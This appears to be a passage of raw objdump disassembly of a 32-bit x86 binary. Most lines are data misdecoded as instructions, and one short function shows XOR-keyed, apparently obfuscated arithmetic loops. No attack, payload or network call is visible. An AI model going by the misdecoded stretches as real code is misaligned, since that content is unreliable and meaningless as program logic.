  420793:	aaa    
  420794:	xor    dl,BYTE PTR [edx-0x52]
  420797:	pop    edx
  420798:	aam    0x9d
  42079a:	enter  0xb7d0,0xec
  42079e:	add    al,BYTE PTR ds:0x80482ec3
  4207a4:	dec    esi
  4207a5:	mov    al,0x3f
  4207a7:	add    eax,0x71d806e0
  4207ac:	das    
  4207ad:	and    al,0x58
  4207af:	in     al,dx
  4207b0:	test   eax,0xe644c503
  4207b5:	or     DWORD PTR [ebx],ebp
  4207b7:	push   ecx
  4207b8:	mov    edi,0xf2d1cdb2
  4207bd:	adc    al,0xd6
  4207bf:	clc    
  4207c0:	gs ror edx,0xc5
  4207c4:	dec    ebx
  4207c5:	in     eax,0x43
  4207c7:	sbb    al,0x7e
  4207c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ca:	and    DWORD PTR [ecx-0x34aafc44],ebp
  4207d0:	cmp    DWORD PTR [edi],edi
  4207d2:	jl     0x420775
  4207d4:	xchg   esp,eax
  4207d5:	adc    al,0xb4
  4207d7:	imul   ecx,DWORD PTR [ebp+ecx*2+0x3a],0x71
  4207dc:	cld    
  4207dd:	or     al,0x5f
  4207df:	inc    edx
  4207e0:	push   ss
  4207e1:	or     DWORD PTR [ebx+0x52c46be5],esp
  4207e7:	(bad)  
  4207e8:	mov    dl,0xa6
  4207ea:	stc    
  4207eb:	outs   dx,BYTE PTR ds:[esi]
  4207ec:	mov    cl,0x5e
  4207ee:	add    al,0x55
  4207f0:	dec    ebp
  4207f1:	iret   
  4207f2:	pop    es
  4207f3:	cmp    eax,0xcad709c0
  4207f8:	jp     0x4207a2
  4207fa:	bound  eax,QWORD PTR [esi]
  4207fc:	adc    al,0x5d
  4207fe:	sbb    DWORD PTR [edi-0x21],eax
  420801:	shr    BYTE PTR [eax-0x2d],1
  420804:	sub    al,0x7
  420806:	mov    ebx,?
  420808:	xrelease xchg BYTE PTR [eax-0x68],ch
  42080c:	pop    edi
  42080d:	shl    BYTE PTR [esi+0x1514b114],0x61
  420814:	test   bl,ah
  420816:	pop    ebp
  420817:	rep outs dx,DWORD PTR ds:[esi]
  420819:	stos   DWORD PTR es:[edi],eax
  42081a:	imul   edx,DWORD PTR [edi+0x69699c15],0x2e
  420821:	add    BYTE PTR [edi+esi*4],ah
  420824:	xchg   esp,eax
  420825:	dec    esi
  420826:	enter  0x815a,0x94
  42082a:	jne    0x42084e
  42082c:	out    dx,al
  42082d:	aad    0xe1
  42082f:	adc    BYTE PTR [ebx],bl
  420831:	mov    WORD PTR [edx+0x5c92d93d],?
  420837:	sti    
  420838:	fs sahf 
  42083a:	jecxz  0x4207d9
  42083c:	add    al,0xb1
  42083e:	sbb    bl,al
  420840:	sub    al,bh
  420842:	mov    eax,0x56e3bfab
  420847:	inc    ebp
  420848:	cmp    al,0xff
  42084a:	js     0x420845
  42084c:	std    
  42084d:	cs jp  0x420853
  420850:	dec    ebp
  420851:	daa    
  420852:	xor    eax,edi
  420854:	es (bad) 
  420856:	fld    QWORD PTR [esi]
  420858:	popa   
  420859:	ret    0x5835
  42085c:	repnz sbb edi,DWORD PTR [eax]
  42085f:	pop    ecx
  420860:	cmp    al,BYTE PTR [ebp+0x59f99b61]
  420866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420867:	retf   0x7dc1
  42086a:	or     edi,ecx
  42086c:	rcl    BYTE PTR [ecx+0x15ace620],0x7
  420873:	xor    DWORD PTR [ebp+eiz*2-0x7506355e],0x4
  42087b:	push   ss
  42087c:	cdq    
  42087d:	cmp    bh,dh
  42087f:	mov    ah,0x89
  420881:	enter  0x6958,0xc8
  420885:	rol    DWORD PTR [eax],0xda
  420888:	cmp    eax,0x95b5954c
  42088d:	mov    eax,ds:0x8b1d5069
  420892:	push   ecx
  420893:	div    BYTE PTR [ebp+0x55]
  420896:	stos   DWORD PTR es:[edi],eax
  420897:	jns    0x420889
  420899:	dec    ebp
  42089a:	dec    ecx
  42089b:	adc    eax,0xfa1c7018
  4208a0:	or     DWORD PTR [ebx+edx*8],esp
  4208a3:	pop    edx
  4208a4:	mov    ecx,0xb55c0b08
  4208a9:	xor    edi,ebp
  4208ab:	sbb    DWORD PTR [ebp+0x9],ecx
  4208ae:	dec    eax
  4208af:	fistp  QWORD PTR [edi-0x1b]
  4208b2:	mov    dh,0x8d
  4208b4:	inc    ebp
  4208b5:	cld    
  4208b6:	test   eax,0x20b1d016
  4208bb:	inc    esi
  4208bc:	lods   eax,DWORD PTR ds:[esi]
  4208bd:	leave  
  4208be:	fcomp  DWORD PTR [eax]
  4208c0:	sbb    dh,0xda
  4208c3:	push   ds
  4208c4:	int3   
  4208c5:	and    esi,DWORD PTR [ebp+0x19]
  4208c8:	pop    edi
  4208c9:	add    BYTE PTR [ebx-0x7eff6770],ch
  4208cf:	xchg   ebp,eax
  4208d0:	pop    ds
  4208d1:	push   esi
  4208d2:	mov    DWORD PTR [esi],0x2366f1aa
  4208d8:	out    dx,al
  4208d9:	jb     0x4208e2
  4208db:	xchg   ebx,eax
  4208dc:	dec    ecx
  4208dd:	js     0x42092c
  4208df:	mov    esi,0xe821690c
  4208e4:	push   esp
  4208e5:	pop    eax
  4208e6:	add    BYTE PTR [ebx+0x1a],0xf6
  4208ea:	add    esp,0x34c8306a
  4208f0:	inc    edi
  4208f1:	cli    
  4208f2:	call   0x8b90:0x50ec3410
  4208f9:	rcr    DWORD PTR [ebx+0x35],0xcf
  4208fd:	iret   
  4208fe:	rcr    ah,cl
  420900:	cwde   
  420901:	test   BYTE PTR [eax+0x14],al
  420904:	xor    ah,dh
  420906:	sahf   
  420907:	pop    ds
  420908:	loopne 0x4208ff
  42090a:	arpl   WORD PTR [ecx+0x52],bx
  42090d:	popf   
  42090e:	jo     0x4208e0
  420910:	int    0x8
  420912:	push   cs
  420913:	pop    es
  420914:	dec    ebp
  420915:	mov    ebp,0xd0334659
  42091a:	ja     0x420937
  42091c:	hlt    
  42091d:	out    0x22,al
  42091f:	imul   edi,DWORD PTR [ecx-0x78d121aa],0x758a288d
  420929:	rol    BYTE PTR [ebx+edx*1+0x5caa322a],cl
  420930:	leave  
  420931:	xor    BYTE PTR [ebx-0x7a],0x2d
  420935:	cmp    ecx,DWORD PTR ds:0xa395820e
  42093b:	or     ah,BYTE PTR [ecx-0x15d71083]
  420941:	inc    edi
  420942:	retf   0x8bf0
  420945:	dec    ebp
  420946:	clc    
  420947:	stos   DWORD PTR es:[edi],eax
  420948:	ja     0x4208fa
  42094a:	inc    edx
  42094b:	inc    ebx
  42094c:	shl    dl,1
  42094e:	nop
  42094f:	popa   
  420950:	cli    
  420951:	loop   0x420940
  420953:	adc    cl,al
  420955:	aad    0xf
  420957:	ret    0x2c8e
  42095a:	dec    ecx
  42095b:	xchg   DWORD PTR [edx-0x4263d1d9],edx
  420961:	(bad)  
  420962:	pop    DWORD PTR [edi]
  420964:	lock jp 0x420983
  420967:	sub    DWORD PTR [edx+0x25],esi
  42096a:	sub    al,0xa7
  42096c:	pop    ebp
  42096d:	cli    
  42096e:	pop    edx
  42096f:	dec    esp
  420970:	fild   QWORD PTR gs:[ebp-0xf]
  420974:	stos   BYTE PTR es:[edi],al
  420975:	mov    dl,0xb7
  420977:	das    
  420978:	bnd jg 0x42094f
  42097b:	clc    
  42097c:	popf   
  42097d:	mov    bl,0xc2
  42097f:	lods   eax,DWORD PTR ds:[esi]
  420980:	dec    edi
  420981:	scas   al,BYTE PTR es:[edi]
  420982:	xchg   DWORD PTR [eax-0x6d],ebx
  420985:	adc    esp,DWORD PTR [edx]
  420987:	inc    eax
  420988:	mov    ds:0x84fcf77f,al
  42098d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42098e:	xchg   esp,eax
  42098f:	addr16 cld 
  420991:	xchg   ebx,eax
  420992:	fsub   st(7),st
  420994:	mov    dh,ch
  420996:	xor    DWORD PTR [ebx-0x6e4f09],esi
  42099c:	out    0x84,al
  42099e:	xchg   esp,eax
  42099f:	loope  0x4209af
  4209a1:	daa    
  4209a2:	fmul   QWORD PTR [edx-0x37]
  4209a5:	cmp    al,BYTE PTR [ecx]
  4209a7:	add    BYTE PTR [ebp-0x5c],bh
  4209aa:	fcmovne st,st(2)
  4209ac:	sub    al,0xb8
  4209ae:	fsub   QWORD PTR [esi-0x1446f910]
  4209b4:	mov    al,ds:0xdbaeefd1
  4209b9:	mov    edx,0x3a444eed
  4209be:	inc    ebx
  4209bf:	mov    ah,0xf6
  4209c1:	mov    ebx,DWORD PTR [edx-0x14]
  4209c4:	repz test DWORD PTR [esi+0xfe9de71],ecx
  4209cb:	inc    ecx
  4209cc:	xchg   edi,eax
  4209cd:	out    dx,eax
  4209ce:	das    
  4209cf:	loope  0x420a1e
  4209d1:	or     eax,0x6ac1e367
  4209d6:	pop    ds
  4209d7:	mov    edx,0xb92ecde8
  4209dc:	popa   
  4209dd:	jae    0x4209c1
  4209df:	fs mov edi,0xc9d070d9
  4209e5:	add    DWORD PTR [edi-0x6f232537],esi
  4209eb:	imul   BYTE PTR [ebx-0x2b]
  4209ee:	sub    DWORD PTR [edx+0xad9886e],ebx
  4209f4:	push   ecx
  4209f5:	mov    dh,0x81
  4209f7:	jmp    0x4209f6
  4209f9:	dec    edi
  4209fa:	pushf  
  4209fb:	(bad)  
  4209fd:	scas   eax,DWORD PTR es:[edi]
  4209fe:	mov    BYTE PTR [ebx],dl
  420a00:	add    al,0x57
  420a02:	push   ebx
  420a03:	in     eax,dx
  420a04:	es inc ebp
  420a06:	sub    BYTE PTR [eax],dh
  420a08:	and    eax,0x7d2c2cf1
  420a0d:	dec    eax
  420a0e:	inc    eax
  420a0f:	adc    DWORD PTR ds:0x15d6fb5b,edx
  420a15:	stos   DWORD PTR es:[edi],eax
  420a16:	hlt    
  420a17:	xchg   BYTE PTR [esi-0x6c45973d],al
  420a1d:	or     BYTE PTR [ebx],dl
  420a1f:	cmc    
  420a20:	out    dx,eax
  420a21:	shr    DWORD PTR [esi],cl
  420a23:	push   0x84cbf362
  420a28:	mov    al,0x2e
  420a2a:	push   ebp
  420a2b:	push   eax
  420a2c:	adc    al,0x9a
  420a2e:	pop    esp
  420a2f:	sub    BYTE PTR [edx+0x453f1f55],0xb
  420a36:	push   esp
  420a37:	sub    al,0x61
  420a39:	fnstenv [ebx+0x47]
  420a3c:	xlat   BYTE PTR ds:[ebx]
  420a3d:	popa   
  420a3e:	jp     0x4209f6
  420a40:	dec    edx
  420a41:	add    edx,DWORD PTR [edx+0x9]
  420a44:	stos   DWORD PTR es:[edi],eax
  420a45:	scas   al,BYTE PTR es:[edi]
  420a46:	push   ss
  420a47:	cmp    al,0x4d
  420a49:	dec    eax
  420a4a:	pop    es
  420a4b:	mov    cs,WORD PTR [esi+0x30dbc67]
  420a51:	hlt    
  420a52:	sar    dh,0x53
  420a55:	xchg   esi,eax
  420a56:	retf   
  420a57:	ror    DWORD PTR [edx+ebp*1],0xff
  420a5b:	add    al,0x1f
  420a5d:	mov    dl,0x12
  420a5f:	daa    
  420a60:	mov    ecx,0x8e9dd1d8
  420a65:	pop    ds
  420a66:	mov    eax,0x70bcbff
  420a6b:	(bad)  [ebx+0x3433b856]
  420a71:	arpl   bx,si
  420a73:	cmp    esp,ebx
  420a75:	adc    eax,0xa128853f
  420a7a:	imul   edx,eax,0xffffff92
  420a7d:	add    al,0xac
  420a7f:	imul   BYTE PTR [edx]
  420a81:	ds pop ebp
  420a83:	mov    WORD PTR [ecx],?
  420a85:	int3   
  420a86:	pop    edi
  420a87:	dec    ebx
  420a88:	ffreep st(5)
  420a8a:	dec    esp
  420a8b:	pop    esp
  420a8c:	out    dx,al
  420a8d:	fs je  0x420a71
  420a90:	das    
  420a91:	mov    cs,WORD PTR [ebp+0x33]
  420a94:	iret   
  420a95:	adc    edi,eax
  420a97:	sub    ch,BYTE PTR [ecx-0x3b]
  420a9a:	inc    esp
  420a9b:	jmp    0xc4f0:0xdbca4ad5
  420aa2:	clc    
  420aa3:	cdq    
  420aa4:	or     eax,0x66f54f2d
  420aa9:	rcr    DWORD PTR [ebx+0x6d270b60],1
  420aaf:	sbb    BYTE PTR [ebp-0x4a],0x42
  420ab3:	mov    eax,0xeddbd0a7
  420ab8:	shr    DWORD PTR [edx-0x69606471],0x35
  420abf:	add    eax,0xa8ab67e0
  420ac4:	inc    ebx
  420ac5:	lods   al,BYTE PTR ds:[esi]
  420ac6:	jmp    0x420ac8
  420ac8:	mov    ecx,0x1da4af64
  420acd:	push   edi
  420ace:	scas   eax,DWORD PTR es:[edi]
  420acf:	loope  0x420b1f
  420ad1:	outs   dx,DWORD PTR ds:[esi]
  420ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ad3:	addr16 push ds
  420ad5:	lahf   
  420ad6:	adc    al,0xee
  420ad8:	jmp    0x420ab3
  420ada:	mov    eax,ds:0x926b8e51
  420adf:	dec    ebp
  420ae0:	pop    ds
  420ae1:	mov    DWORD PTR [esi-0x3e],ebx
  420ae4:	nop
  420ae5:	sub    al,0x9e
  420ae7:	je     0x420a7f
  420ae9:	mov    DWORD PTR [edi+0x16c5f459],edx
  420aef:	jp     0x420b44
  420af1:	dec    ebp
  420af2:	dec    ecx
  420af3:	pop    esi
  420af4:	jbe    0x420b23
  420af6:	in     eax,0x2b
  420af8:	in     al,0xa8
  420afa:	adc    al,dl
  420afc:	into   
  420afd:	add    DWORD PTR [eax+0x3acb3aa4],ecx
  420b03:	xor    esi,DWORD PTR [edi+esi*4+0x49269ed8]
  420b0a:	retf   
  420b0b:	leave  
  420b0c:	addr16 cs cdq 
  420b0f:	imul   ecx,DWORD PTR [ebp-0x4d],0x30
  420b13:	retf   
  420b14:	add    ecx,DWORD PTR ds:0x1b1a818d
  420b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b1b:	inc    BYTE PTR [esi-0x77]
  420b1e:	popa   
  420b1f:	xchg   ebp,eax
  420b20:	add    esi,DWORD PTR [esi+0x75]
  420b23:	or     eax,0x47a8f3ad
  420b28:	and    BYTE PTR [edi+0x6],dl
  420b2b:	sbb    dh,ah
  420b2d:	jecxz  0x420b9c
  420b2f:	jmp    0x2c5bdc77
  420b34:	rol    DWORD PTR [ecx+0x4a],1
  420b37:	mov    ds:0x5f78a180,al
  420b3c:	shr    ecx,1
  420b3e:	push   ecx
  420b3f:	loopne 0x420baf
  420b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b42:	js     0x420bc0
  420b44:	mov    ah,0x19
  420b46:	or     BYTE PTR [ecx-0x7312f028],dh
  420b4c:	addr16 and ebx,esp
  420b4f:	xchg   ebx,eax
  420b50:	jmp    0xd0850e7d
  420b55:	ds sbb ch,dh
  420b58:	mov    edx,0x7a7254cf
  420b5d:	stc    
  420b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b5f:	adc    DWORD PTR [edx],0xbddc838a
  420b65:	mov    ebp,0x24af8201
  420b6a:	test   DWORD PTR [ecx],ebp
  420b6c:	xor    DWORD PTR [ebp-0x71dcdfc0],eax
  420b72:	sbb    ebp,edi
  420b74:	jns    0x420b81
  420b76:	mov    esi,0xeb705c1e
  420b7b:	ja     0x420b6c
  420b7d:	in     eax,0x75
  420b7f:	cmp    DWORD PTR [ecx-0x7e],eax
  420b82:	mov    dl,0xb8
  420b84:	jb     0x420b88
  420b86:	xor    BYTE PTR [ecx-0x6bb4649e],ch
  420b8c:	sbb    eax,0x57e75051
  420b91:	mov    DWORD PTR [ebx-0x5f02c978],esi
  420b97:	cs sahf 
  420b99:	xchg   BYTE PTR [ebx+eiz*4],cl
  420b9c:	push   esp
  420b9d:	jno    0x420b44
  420b9f:	inc    esp
  420ba0:	adc    DWORD PTR [eax+0x45],ecx
  420ba3:	daa    
  420ba4:	sti    
  420ba5:	dec    edx
  420ba6:	push   ecx
  420ba7:	mov    cl,0x1
  420ba9:	dec    ebx
  420baa:	dec    ebx
  420bab:	cmp    DWORD PTR [ebp+0xb7b3c05],eax
  420bb1:	jne    0x420baf
  420bb3:	aaa    
  420bb4:	jae    0x420c1e
  420bb6:	jge    0x420b66
  420bb8:	ins    DWORD PTR es:[edi],dx
  420bb9:	fwait
  420bba:	call   DWORD PTR [ecx+eiz*1]
  420bbd:	jmp    0xe030:0xc5ffcc1a
  420bc4:	(bad)  
  420bc5:	fsub   DWORD PTR ds:0xc1b5f2e3
  420bcb:	pop    edx
  420bcc:	fld    QWORD PTR [esi-0x51948a04]
  420bd2:	xchg   ebp,eax
  420bd3:	add    ah,ch
  420bd5:	jmp    0xa35d97f3
  420bda:	jg     0x420bf0
  420bdc:	dec    edi
  420bdd:	cs push ebx
  420bdf:	adc    eax,0x482e002f
  420be4:	aad    0xb6
  420be6:	and    al,0x55
  420be8:	sbb    al,0x9e
  420bea:	jge    0x420c1d
  420bec:	add    esp,ebx
  420bee:	repz and al,0x55
  420bf1:	ret    
  420bf2:	aam    0x77
  420bf4:	pop    ebx
  420bf5:	inc    ebx
  420bf6:	dec    edx
  420bf7:	xchg   ecx,eax
  420bf8:	mov    ch,0xd
  420bfa:	jae    0x420c40
  420bfc:	jle    0x420c2b
  420bfe:	sbb    BYTE PTR [edx+0x7702e06e],ch
  420c04:	iret   
  420c05:	mov    al,0xd5
  420c07:	clc    
  420c08:	and    BYTE PTR [edi],al
  420c0a:	in     eax,0x42
  420c0c:	mov    bh,0xa2
  420c0e:	mov    esp,0x213edcda
  420c13:	sti    
  420c14:	adc    bl,BYTE PTR [edi+0x47]
  420c17:	daa    
  420c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c19:	xchg   BYTE PTR [esi],cl
  420c1b:	ss add eax,0xb4dce772
  420c21:	jl     0x420be9
  420c23:	daa    
  420c24:	and    eax,0xfca24bb2
  420c29:	add    DWORD PTR [ebx-0x23],eax
  420c2c:	jge    0x420c9d
  420c2e:	dec    ebp
  420c2f:	outs   dx,DWORD PTR ds:[esi]
  420c30:	retf   0x6e4f
  420c33:	cld    
  420c34:	jp     0x420bca
  420c36:	xchg   ecx,eax
  420c37:	push   ss
  420c38:	dec    ebp
  420c39:	xor    BYTE PTR [ebx-0x34],0xee
  420c3d:	aas    
  420c3e:	(bad)  
  420c3f:	mov    cl,0xae
  420c41:	dec    ebx
  420c42:	mov    bl,0x48
  420c44:	iret   
  420c45:	and    cl,dl
  420c47:	mov    bh,0xae
  420c49:	icebp  
  420c4a:	mov    ebp,0xcb36d0e3
  420c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c50:	jmp    0x7f76dbb4
  420c55:	mov    cl,BYTE PTR [edi-0x8]
  420c58:	adc    ah,bh
  420c5a:	lods   eax,DWORD PTR ds:[esi]
  420c5b:	mov    edi,0xfb7eda57
  420c60:	fisubr DWORD PTR [eax-0x773ad48b]
  420c66:	add    BYTE PTR [ecx+0x218be734],bl
  420c6c:	mov    ecx,0xa2c64c7c
  420c71:	fcmovnu st,st(2)
  420c73:	xor    DWORD PTR [ebx+0x72ca9bc6],edx
  420c79:	int    0x84
  420c7b:	jb     0x420cb2
  420c7d:	or     eax,0x83138490
  420c82:	dec    ebx
  420c83:	add    edi,esp
  420c85:	lahf   
  420c86:	(bad)  
  420c87:	sub    DWORD PTR [edx],eax
  420c89:	xchg   DWORD PTR [esi-0x1fa959f3],ebx
  420c8f:	add    al,0xa8
  420c91:	sub    eax,0x20a3ffaf
  420c96:	in     eax,dx
  420c97:	jne    0x420c21
  420c99:	sbb    al,0x9
  420c9b:	ins    DWORD PTR es:[edi],dx
  420c9c:	cli    
  420c9d:	sub    ah,BYTE PTR [eax]
  420c9f:	ftst   
  420ca1:	adc    ch,0x23
  420ca4:	push   esi
  420ca5:	push   eax
  420ca6:	dec    ecx
  420ca7:	sub    esi,DWORD PTR [ebp-0x112b2ae0]
  420cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cae:	dec    esi
  420caf:	mov    edi,0x86740160
  420cb4:	jl     0x420c69
  420cb6:	test   BYTE PTR [ebx],dh
  420cb8:	mov    esi,0x17be04f9
  420cbd:	add    al,0x3a
  420cbf:	push   edi
  420cc0:	(bad)  
  420cc1:	int    0xaa
  420cc3:	sub    BYTE PTR [edx+0x52],0x12
  420cc7:	aad    0x3f
  420cc9:	adc    edx,DWORD PTR [eax]
  420ccb:	clc    
  420ccc:	jns    0x420cef
  420cce:	xchg   edi,eax
  420ccf:	fs aad 0xbd
  420cd2:	in     eax,0x56
  420cd4:	sbb    al,0xa
  420cd6:	popa   
  420cd7:	push   es
  420cd8:	out    0xe9,al
  420cda:	mov    esp,0xc54b6e80
  420cdf:	js     0x420c9e
  420ce1:	jmp    0xe9d0a3ce
  420ce6:	or     ch,BYTE PTR [edi+0x70]
  420ce9:	and    cl,BYTE PTR [ecx-0x66]
  420cec:	rcr    BYTE PTR [eax],cl
  420cee:	ror    al,0x25
  420cf1:	lods   eax,DWORD PTR ds:[esi]
  420cf2:	jle    0x420cbd
  420cf4:	iret   
  420cf5:	push   edx
  420cf6:	shl    DWORD PTR [ebx+0x762e8cdb],0x1c
  420cfd:	jp     0x420d6c
  420cff:	mov    ecx,0xa708c0f5
  420d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d05:	xor    cl,BYTE PTR ds:0xa58bffe1
  420d0b:	lods   eax,DWORD PTR ds:[esi]
  420d0c:	popa   
  420d0d:	mov    eax,0xf117442b
  420d12:	pop    esp
  420d13:	mov    edx,0xfb339d50
  420d18:	mov    DWORD PTR [edx],edi
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
